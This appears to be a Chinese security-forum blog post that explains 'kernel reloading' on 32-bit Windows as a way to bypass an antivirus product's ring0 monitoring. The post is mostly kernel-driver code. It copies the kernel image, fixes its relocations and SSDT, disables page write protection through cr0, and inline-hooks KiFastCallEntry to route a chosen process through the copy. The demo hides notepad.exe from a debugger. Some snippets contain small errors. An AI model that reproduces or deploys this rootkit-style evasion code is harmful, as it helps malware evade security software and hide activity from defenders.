0x00 前言
=======

内核重载听起来是一个很高大上的概念，但其实跟PE的知识息息相关，那么为什么会有内核重载的出现呢？

我们知道从ring3进入ring0需要通过`int2e/sysenter(syscall)`进入ring0，而进入ring0之后又会通过`KiFastCallEntry/KiSystemService`去找SSDT表对应响应的内核函数，那么杀软会在这两个地方进行重点盯防。

首先是对`int2e/sysenter`的盯防，我们知道大多数函数都是通过一系列的调用链，最终找到`ntdll.dll`里面的函数，找到调用号后通过`int2e/sysenter`的方式进入ring0，杀软首先会hook `ntdll.dll`来实现监测的效果，这里的话之前已经介绍过了，我们可以通过自己逆向的方式通过汇编定位到`int2e/sysenter`的地址自己重写ring3部分的api来达到绕过杀软的效果

那么再看ring0，我们知道ring3函数进入ring0之后会去找SSDT表，那么这里就有两种监测的方式，一种的话直接在`KiSystemService/KiFastCallEntry`挂个钩子，因为无论是什么函数，`KiSystemService/KiFastCallEntry`是必经之路，还有一种的话就是通过hook SSDT表里面的函数，但是那样的话会很麻烦，所以杀软一般都是通过前者来实现ring0的监控

我们这里以某数字杀软为例，通过汇编代码的对比，发现某数字杀软在`804de978`处更改了一个`jmp`指令，我们可以看一下前后的对比

```c++
hook前：
    sub esp,ecx
    shr ecx,2
hook后：
    jmp 867bf958
```

![image-20220319092616110.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-c0bc3e84ec35927c25fb46c06c0a67794faf1110.png)

![image-20220319092633795.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-a08609e1930ec4328ad492a037beec04ffc17403.png)

我们知道要使用Inline hook必须要有5个字节的空间，但是`KiFastCallEntry`这个函数会有很多寄存器的操作，我们如果随便挑选5个字节去操作的话很可能会蓝屏，我们可以看一下某数字杀软挑选的hook点。在这个地方不仅能得到ssdt的地址，还能得到ssdt地址总表，更能得到ssdt索引号，也就是在这个地方不仅不用我们进行寄存器的操作避免蓝屏，还能够直接拿到ssdt表的信息，可谓是风水宝地

那么我们知道了杀软在ring0的监测原理，我们该如何进行绕过呢？

这里就可以使用到内核重载，内核重载顾名思义，就是复制一份内核的代码，当我们复制一份内核的代码之后，让程序走我们自己复制的这一份内核代码，杀软监控只能监控之前的那份内核代码，从而绕过ring0的监控

0x01 思路
=======

复制内核也是有讲究的，我们知道内核文件本质上也遵循PE结构，那么PE文件的文件偏移和内存偏移也是我们需要考量的一个点，不能说我们直接将内核文件copy一份就能够跑起来，这里就需要进行PE的拉伸。那么既然有PE的拉伸，就要涉及到重定位表，我们要想定位到函数，这里肯定就需要进行重定位表的修复

在PE拉伸完成和修复重定位表过后，我们获得了一份新的内核，但是这里SSDT因为是直接拿过来的，地址肯定会发生变化，所以这里就需要进行SSDT表的修复

在上面的一系列操作完成之后，我们就可以进行hook操作，这里我们上面已经分析过`KiFastCallEntry`的hook方式，我们在同样的位置设置一个hook即可达到内核重载的效果

0x02 PE拉伸&amp;重定位表修复
====================

这里我把PE拉伸跟重定位表的修复放到一个函数里面，首先我们要进行打开文件的操作，那么这里就要实现几个关于文件的函数操作

主要用到`ZwCreateFile`、`ZwReadFile`、`ExAllocatePool`、`ExFreePool`这几个函数

```c++
// 打开文件
VOID OpenFile(PHANDLE phFile, PUNICODE_STRING DllName)
{
    HANDLE hFile = NULL;
    NTSTATUS status = STATUS_SUCCESS;
    IO_STATUS_BLOCK IoStatus;
    OBJECT_ATTRIBUTES FileAttrObject; // 创建文件属性对象

    // 初始化 OBJECT_ATTRIBUTES 结构体
    InitializeObjectAttributes(&FileAttrObject, DllName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    status = ZwCreateFile(&hFile, GENERIC_ALL, &FileAttrObject, &IoStatus, NULL,FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

    if (!NT_SUCCESS(status))
    {
        DbgPrint("文件创建不成功\n");
        return FALSE;
    }

    if (phFile)
    {
        *phFile = hFile;
    }

    return TRUE;
}

// 获取指定文件大小
ULONG GetFileSize(HANDLE hFile)
{
    IO_STATUS_BLOCK IoStatus;
    NTSTATUS status = STATUS_SUCCESS;
    FILE_STANDARD_INFORMATION Fileinfo; 

    // 获取指定文件大小
    status = ZwQueryInformationFile(hFile, &IoStatus, &Fileinfo, sizeof(Fileinfo), FileStandardInformation); 

    if (!NT_SUCCESS(status))
    {
        DbgPrint("文件信息查询失败\n");
        return FALSE;
    }

    return Fileinfo.EndOfFile.LowPart;
}

// 读取文件到内存
VOID ReadFile(HANDLE hFile, CHAR* Buffer, ULONG readSize)
{
    IO_STATUS_BLOCK IoStatus;
    NTSTATUS status = STATUS_SUCCESS;

    // 读取指定文件到内存中
    status = ZwReadFile(hFile, NULL, NULL, NULL, &IoStatus, Buffer, readSize, NULL, NULL);

    if (!NT_SUCCESS(status))
    {
        DbgPrint("文件读取失败\n");
        return FALSE;
    }
}
```

那么我们首先读取文件到内存

```c++
    OpenFile(&hFile, DllName);
    FileSize = GetFileSize(hFile);
    szBuffer = (PUCHAR)ExAllocatePool(PagedPool, FileSize);
    ReadFile(hFile, szBuffer, FileSize);
```

然后进行拉伸PE的操作

首先判断是否为PE文件，即4D5A

```c++
if (*(PSHORT)szBuffer == 0x5A4D)
```

然后定位到NT头，偏移为0x3c。判断一下是否为5045，即PE标志

![image-20220319111636941.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-002ad13d42f0fb28b59fadec19d6571a7d715fab.png)

```c++
PUCHAR NTHeader = *(PULONG)(szBuffer + 0x3C) + szBuffer;
if (*(PULONG)NTHeader == 0x4550)
```

然后获取一下可选PE头里面的`SizeOfImage`和`SizeOfHeaders`，这里偏移为`SizeOfImage`的偏移为 0x18+0x38 = 0x50，同理`SizeOfHeaders`的偏移为0x54

![image-20220319111804334.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-f60d906fd2b39a66b3a9109b6a4412eb197d3909.png)

```c++
// 获取SizeOfImage
ULONG SizeOfImage = *(PULONG)(NTHeader + 0x50);

// 获取SizeOfHeaders
ULONG SizeOfHeaders = *(PULONG)(NTHeader + 0x54);
```

然后使用`ExAllocatePool`申请一块空间并用`MmIsAddressValid`判断是否可用，避免蓝屏

```c++
PUCHAR szBufferSize = ExAllocatePool(NonPagedPool, SizeOfImage);

if (!MmIsAddressValid(szBufferSize))    // 检验是否该内存是否有权限操作
{
    DbgPrint("Memory error\n");
    return NULL;
}
```

那么我们将PE头拷贝到我们申请的内存空间里面并定义一系列指针指向头

```c++
            // 拷贝PE头
            RtlCopyMemory(szBufferSize, szBuffer, PEHeaderSize);

            // 获取NT头
            PIMAGE_NT_HEADERS NtHeader = (PIMAGE_NT_HEADERS)(((PIMAGE_DOS_HEADER)szBufferSize)->e_lfanew + szBufferSize);

            // 获取标准PE头
            PIMAGE_FILE_HEADER FileHeader = &NtHeader->FileHeader;

            // 获取可选PE头
            PIMAGE_OPTIONAL_HEADER OptionalHeader = &NtHeader->OptionalHeader;

            // 获取可选PE头大小
            ULONG SizeOfOptional = FileHeader->SizeOfOptionalHeader;

            // 获取节的数量
            SHORT SectionNumber = FileHeader->NumberOfSections;

            // 获取节表位置
            PUCHAR SectionBaseAddr = (PUCHAR)((PUCHAR)NtHeader + 0x4 + 0x14 + SizeOfOptional);
            PUCHAR pSectionBaseAddr = SectionBaseAddr;
```

然后进行节表的拷贝，因为我们已经获取到了节的数量，所以可以直接使用遍历的方式拷贝，这里我们定义三个变量获取节中的`VirtualAddress`、`SizeOfRawData`、`PointerToRawData`属性，分别在0xc、0x10、0x14的位置

![image-20220319112520245.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-29af35ee2c6ec4c1c8b646cec9310b3c8664a518.png)

```c++
            // 拷贝节
            CHAR Name[0x9] = { 0 };

            for (int i = 0; i < SectionNumber; i++)
            {
                RtlCopyMemory(Name, pSectionBaseAddr, 0x8);
                DbgPrint(("Name: %s\n", Name));

                ULONG PointerToRawData = *(PULONG)(pSectionBaseAddr + 0x14);
                ULONG SizeOfRawData = *(PULONG)(pSectionBaseAddr + 0x10);
                ULONG VirtualAddress = *(PULONG)(pSectionBaseAddr + 0xC);

                RtlCopyMemory(szBufferSize + VirtualAddress, szBuffer + PointerToRawData, SizeOfRawData);

                pSectionBaseAddr += 0x28; // 下一个节
            }
```

然后我们再对重定位表进行修复，首先看下重定位表的结构，位于数据目录项的第6个

```c++
typedef struct _IMAGE_DATA_DIRECTORY {
    DWORD   VirtualAddress;
    DWORD   Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;
```

跟导出表相同，VirtualAddress存放的是指向真正重定位表地址的rva，而Size重定位表的大小，通过RVA-&gt;FOA在FileBuffer定位后得到真正重定位表的结构如下

```c++
typedef struct _IMAGE_BASE_RELOCATION {
    DWORD   VirtualAddress;
    DWORD   SizeOfBlock;
} IMAGE_BASE_RELOCATION;
typedef IMAGE_BASE_RELOCATION ，* PIMAGE_BASE_RELOCATION;
```

这里的VirtualAddress还是RVA，SizeOfBlock则是重定位表的核心结构，存储的值以字节为单位，表示的是重定位表的大小，那么如果我们要知道重定位表结构的数量该怎么办呢？

这里规定在最后一个结构的VirtualAddress和SizeOfBlock的值都为0，这里就可以进行判断来获取重定位表有多少个结构

我们来看一看直观的重定位表图，假设我们这里重定位结构的数量为3，那么在最后8字节即VirtualAddress和SizeOfBlock的值都为0，可以说重定位表就是很多个块结构所构成的。

![image-20220319113133934.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-3000c4861489ac6e487e07d76416b1faeae97ba8.png)

在每一块结构的VirtualAddress和SizeOfBlock里面，都有很多宽度为2字节的十六进制数据，这里我们称他们为具体项。在内存中页大小的值为1000H，即2的12次方，也就是通过这个1000H就能够表示出一个页里面所有的偏移地址。而具体项的宽度为16位，页大小的值为低12位，那么高4位是用来表示什么呢？

这里高4位只可能有两种情况，0011或0000，对应的十进制就是3或0。

当高4位的值为0011的时候，我们需要修复的数据地址就是VirtualAddress + 低12位的值。例如这里我的VirtualAddress是0x12345678，具体项的数值为001100000001，那么这个值就是有意义的，需要修改的RVA = 0x12345678+0x00000001 = 0x12345679。

当高4位的值为0000的时候，这里就不需要进行重定位的修改，这里的具体项只是用于数据对齐的数据。

也就是说，我们如果要进行重定位表的修改，就只需要判断具体项的高4位是否为0011，若是则进行重定位表的修复即可

实现代码如下

```c++
    KernelBaseRelocation = 
        (PIMAGE_BASE_RELOCATION)(NewKernelImageBase + KernelNtHeaders->OptionalHeader.DataDirectory[5].VirtualAddress);

    while (KernelBaseRelocation->SizeOfBlock != 0 && KernelBaseRelocation->VirtualAddress != 0)
    {
        // 要修改的重定位表的数量
        NumberOfModify = (KernelBaseRelocation->SizeOfBlock - 8) / 2;

        // 得到索引Base的偏移
        BaseAddr = (PSHORT)((ULONG)KernelBaseRelocation + 8);

        while (NumberOfModify--)
        {

            //得到Base
            Base = *BaseAddr;

            // 判断高4位是否为3，若为3则修改
            if (*BaseAddr>>12 == 3)
            {
                // 清除属性位
                Base = Base & 0x0FFF;

                // 得到要修改全局变量的索引
                PULONG AddOfModify = (PULONG)(NewKernelImageBase + KernelBaseRelocation->VirtualAddress + Base);

                *AddOfModify = *AddOfModify - KernelNtHeaders->OptionalHeader.ImageBase + (ULONG)OldKernelImageBase;
            }

            // 得到下一个BaseAddr
            BaseAddr++;
        }

        // 下一个重定位表
        KernelBaseRelocation = (PIMAGE_BASE_RELOCATION)((ULONG)KernelBaseRelocation + KernelBaseRelocation->SizeOfBlock);
    }
```

0x03 SSDT表修复
============

因为SSDT结构有多层，所以要分别进行运算。首先确定新SSDT在哪个位置，用导出`KeServiceDescriptorTable`导出的老内核的SSDT结构，然后用原来的SSDT地址+相对加载地址即可得到新的SSDT地址。

然后再修正SSDT函数中的地址。方法是在原来的函数地址上+ 相对加载地址，即相对加载地址 = 新内核加载地址 - 老内核加载地址

```c++
PSystemServiceTable KeServiceTable = KeServiceDescriptorTable;  // SSDT
PSystemServiceTable KeServiceTableShadow = (PSystemServiceTable)((ULONG)KeServiceTable - 0x40); // SSDTShadow

LONG Offset = (LONG)NewKernelBaseAddr - (LONG)KernelBaseAddr;   // 新SSDT与旧SSDT的相对偏移

PSystemServiceTable NewKeServiceTable = (PSystemServiceTable)((ULONG)KeServiceTable + Offset);  // 新SSDT地址

// 修复 FunctionsAddrTable 、 FunctionsArgsAddrTable 、 FunctionsLimit 
NewKeServiceTable->FunctionsAddrTable = (PULONG)((ULONG)KeServiceTable->FunctionsAddrTable + Offset);   // 函数地址表
NewKeServiceTable->FunctionsArgsAddrTable = (PUCHAR)(KeServiceTable->FunctionsArgsAddrTable + Offset);  // 函数参数表
NewKeServiceTable->FunctionsLimit = KeServiceTable->FunctionsLimit; // 服务个数
```

然后依次遍历修改

```c++
    for (ULONG i = 0; i < NewKeServiceTable->FunctionsLimit; i+++)
    {//新的函数地址再加上相对加载地址，得到现在的ssdt函数地址
       NewKeServiceTable->FunctionsAddrTable[i] += Offset;
    }
```

0x04 hook KiFastCallEntry
=========================

我们在之前已经分析过了hook的地点，那么这里我们直接使用inline hook的方式即可，但是这里只适用于单核环境下，如果是多核情况下发现线程切换的情况下需要使用其他方法来进行hook

这里我们首先写一个判断，如果是我们想要获得的程序进程就走我们自己重载的内核

```c++
LONG FilterFunc(ULONG ServiceTableBase,ULONG FuncIndex,ULONG OrigFuncAddress)
{
    if (ServiceTableBase==(ULONG)KeServiceDescriptorTable.ServiceTableBase)
    {//比较当前调用的进程是不是notepad.exe
        if (!strcmp((char*)PsGetCurrentProcess()+0x174,"notepad.exe"))
        {
            return pNewSSDT->ServiceTableBase[FuncIndex];
        }
    }
    return OrigFuncAddress;
}
```

然后写一个asm使用汇编语句进行调用`FilterFunc`

```c++
VOID __declspec(naked) MyFunction()
{
    __asm
    {
        pushad
        pushfd
    }

    // 测试是否hook成功
    __asm
    {
        push ebx
        push eax
        push edi
        call FilterFunc
    }

    // 修改ebx
    __asm
    {
        mov dword ptr ss : [esp + 0x14] , eax
    }

    __asm
    {
        popfd
        popad
    }

    // 执行原代码
    __asm
    {
        sub esp, ecx
        shr ecx, 2
    }

    __asm
    {
        jmp RetAddr
    }
}
```

然后进行Inline hook，这里有一个注意的点就是页在默认情况下是只读的，这里就需要修改cr0寄存器的值来进行读写

```c++
// 关闭页只读保护
void _declspec(naked) ShutPageProtect()
{
    __asm
    {
        push eax;
        mov eax, cr0;
        and eax, ~0x10000;
        mov cr0, eax;
        pop eax;
        ret;
    }
}

// 开启页只读保护
void _declspec(naked) OpenPageProtect()
{
    __asm
    {
        push eax;
        mov eax, cr0;
        or eax, 0x10000;
        mov cr0, eax;
        pop eax;
        ret;
    }
}
```

这里首先定位要hook的地址，利用特征码搜索的方式，我们首先看下要hook的两行的硬编码为`2be1c1e902`，放到一个数组里面

```c++
UCHAR shell1[] = { 0x2B, 0xE1, 0xC1, 0xE9, 0x02 };
```

![image-20220322112736143.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-f16ccc416305c40bb8c272bbff1c645ad6fa4b2d.png)

然后为了避免重复的硬编码，这里再判断一下`80542602`这个地方的硬编码是否匹配，若匹配则证明定位准确，同样放在数组里面

```c++
UCHAR shell2[] = { 0x8B, 0x1C, 0x87 };
```

![image-20220322113226064.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-44d1254ea50ad1e577ef26029fe7d6c956b3d5a4.png)

这里写一个比较字符的函数

```c++
ULONG MyCompareString(PUCHAR string1, PUCHAR string2, ULONG number)
{
    // 计数
    ULONG i = 0;

    while (number--)
    {
        if (*(string1 + i) == *(string2 + i))
        {
            i++;
        }
        else
        {
            return FALSE;
        }
    }

    return TRUE;
}
```

然后进行特征码的遍历

```c++
    OldKernelImageBase2 = (PUCHAR)OldKernelImageBase;
    OldKernelSizeOfImage2 = OldKernelSizeOfImage;

    while (OldKernelSizeOfImage2--)
    {
        if (FALSE == MyCompareString(shell1, OldKernelImageBase2, 5))
        {
            OldKernelImageBase2++;
        }
        else
        {
            OldKernelImageBase2 = OldKernelImageBase2 - 3;
            if (FALSE == MyCompareString(shell2, OldKernelImageBase2, 3))
            {
                OldKernelImageBase2 = OldKernelImageBase2 + 4;
                continue;
            }
            else
            {
                HookAddr = (ULONG)OldKernelImageBase2 + 3;
                DbgPrint("hook_address:%x\n", HookAddr);
                break;
            }
        }
    }
```

然后进行hook `FastCallEntry`的操作

```c++
void HookKiFastCallEntry()
{
    UCHAR jmp_code[5];
    jmp_code[0]=0xe9;

    *(ULONG *)&jmp_code[1]=(ULONG)MyKiFastCallEntry-5-hookaddr;

    RetAd = hookaddr + 5;
    ShutPageProtect();
    //inline hook
    RtlCopyMemory((PVOID)addr_hookaddr,jmp_code,5);
    OpenPageProtect();
}
```

0x05 驱动卸载
=========

在驱动卸载的地方，我们把原来的硬编码写回，这里为了防止多核状态下的线程切换，直接使用`cmpxchg8b`指令写回

```c++
VOID __declspec(naked) _fastcall HookFunction(ULONG destination, ULONG exchange, ULONG compare)
{
    __asm
    {
        push ebx
        push ebp
        mov ebp, ecx    // destination = ebp
        mov ebx, [edx]  // exchange低4字节
        mov ecx, [edx + 4]  // exchange高4字节
        mov edx, [esp + 8 + 4]  // compare给edx
        mov eax, [edx]
        mov edx, [edx + 4]
        lock cmpxchg8b qword ptr[ebp]
        pop ebp
        pop ebx
        retn 4
    }
}
```

0x06 实现效果
=========

这里首先看一下没有内核重载之前`KiFastCallEntry`的代码

![image-20220322103954466.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-a351f04e91d628712323725adcd5ece62015d579.png)

在`80542605`的地方汇编语句为`sub esp,ecx`

![image-20220322104013769.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-a71c13c9d3f3d6fbdd364481935ef1b811084ef6.png)

然后我们加载驱动，看到hook的地址正是`80542605`

![image-20220322104828268.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-28ef28e25d9c1534fd7a2353581216c9292f72a6.png)

这里我们再定位到`80542605`的位置发现已经是我们自己写的函数

![image-20220322104901660.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-528a99283416a3b5ef5c3f42c6d7abbc59a073c5.png)

这里跳转过去看看，和我们自己写的`MyFunction`传入的汇编代码是相同的

![image-20220322105041702.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-20b585d8acc8e0dd9778c3dbdd27bf71c0fe2a19.png)

我们再去通过`KiFastCallEntry`定位一下hook点，发现也已经被修改

![image-20220322105535350.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-8f5a7facda56c60d8e3e03d484e4ef8579075c21.png)

![image-20220322105608141.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-6ee1f30bd8a45c58f615d262c3ad971b1ad770f6.png)

![image-20220322114045860.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-497bdaa8c63f1345dab76ff3874e6277beea0c5d.png)

这里为了方便查看效果，我用ssdt hook了`NtOpenProcess`函数，使用ollydbg附加进程可以发现没有`notepad.exe`这个进程，这是因为OD走的是原内核，所以在进程列表里面是没有`notepad.exe`这个进程

![image-20220322114545351.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-b9863444bfa031f64ba58a340fce20adaa287cba.png)

![image-20220322111418866.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-3a226c8344086370c35456c732792fae26481cec.png)

然后这里卸载驱动

![image-20220322111634641.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-5de1705de09fb43f94a04276bd1f756d2be8f958.png)

再去定位到`80542605`地址处，已经恢复成原汇编指令

![image-20220322112714986.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-591dd74a9db2a751abe4883c2bc7bcf0b9b18e0f.png)